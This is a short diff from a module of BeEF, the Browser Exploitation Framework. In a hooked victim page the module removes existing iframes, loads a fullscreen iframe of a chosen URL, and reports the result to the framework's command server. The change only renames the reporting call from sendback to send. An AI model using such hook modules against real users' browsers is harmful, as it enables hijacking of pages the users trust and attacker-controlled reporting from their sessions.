@@ -7,12 +7,12 @@ beef.execute(function() {
 
 	$j("iframe").remove();
 	
-	beef.dom.createIframe('fullscreen', 'get', {'src':iframe_src}, {}, function() { if(!sent) { sent = true; document.title = title; beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result)); } });
+	beef.dom.createIframe('fullscreen', 'get', {'src':iframe_src}, {}, function() { if(!sent) { sent = true; document.title = title; beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result)); } });
 
 	setTimeout(function() { 
 		if(!sent) {
 			result = 'Iframe failed to load, timeout';
-			beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result));
+			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result));
 			document.title = iframe_src + " is not available";
 			sent = true;
 		}
